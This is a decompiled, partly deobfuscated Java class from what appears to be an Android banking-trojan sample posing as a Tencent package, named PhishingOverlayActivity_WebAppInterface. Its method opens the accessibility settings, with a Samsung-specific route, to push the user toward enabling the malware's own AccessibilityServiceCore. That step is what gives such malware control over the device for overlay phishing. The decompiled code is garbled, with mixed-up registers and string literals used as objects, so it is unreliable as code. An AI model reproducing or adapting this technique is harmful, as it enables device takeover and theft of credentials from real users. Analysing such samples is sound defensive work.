package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: PhishingOverlayActivity_WebAppInterface
 * Original: Lcom/tencent/withdrawalhskfdisagreed3$WebAppInterface;
 */
public class PhishingOverlayActivity_WebAppInterface {

    // === FIELDS ===
     Context mContext;
    final PhishingOverlayActivity this$0;

    // === METHODS ===

     void Constructor(PhishingOverlayActivity param0, Context param1) {
        v0.this$0 = v1;
        // new Object()
        v0.mContext = v2;
        return;
    }

    public void returnResult() {
        v0 = ":settings:fragment_args_key";
        v1 = "android.settings.ACCESSIBILITY_SETTINGS";
        v2 = new Intent();
        v3 = "com.samsung.accessibility.installed_service";
        // new Intent("com.samsung.accessibility.installed_service")
        v3 = 1879048192; // 0x70000000
        v2.setFlags("com.samsung.accessibility.installed_service");
        v4 = v6.this$0;
        v4.getPackageManager();
        v2 = v2.resolveActivity(v4);
        if (v4 != null && v4 != 0) { // goto +47
        v2 = new Intent();
        // new Intent("android.settings.ACCESSIBILITY_SETTINGS")
        v4 = v6.this$0;
        v4.getPackageManager();
        v2 = v2.resolveActivity(v4);
        if (v4 != null && v4 != 0) { // goto +30
        // new Intent("android.settings.ACCESSIBILITY_SETTINGS")
        v2 = new ComponentName();
        v4 = PhishingOverlayActivity.myctx;
        v5 = AccessibilityServiceCore.class;
        // new ComponentName(v4, v5)
        ":settings:fragment_args_key".putExtra("android.intent.extra.COMPONENT_NAME", v2);
        ":settings:fragment_args_key".setFlags("com.samsung.accessibility.installed_service");
        "android.intent.extra.COMPONENT_NAME".startActivity(":settings:fragment_args_key");
        return;
        // new StringBuilder()
        "com.samsung.accessibility.installed_service".getPackageName();
        "android.intent.extra.COMPONENT_NAME".append("com.samsung.accessibility.installed_service");
        "android.intent.extra.COMPONENT_NAME".append("/");
        "/".getName();
        "android.intent.extra.COMPONENT_NAME".append("/");
        "android.intent.extra.COMPONENT_NAME".toString();
        // new Bundle()
        "/".putString(":settings:fragment_args_key", "android.intent.extra.COMPONENT_NAME");
        v2.putExtra(":settings:fragment_args_key", "android.intent.extra.COMPONENT_NAME");
        v2.putExtra(":settings:show_fragment_args", "/");
        ":settings:show_fragment_args".startActivity(v2);
        return;
    }
}
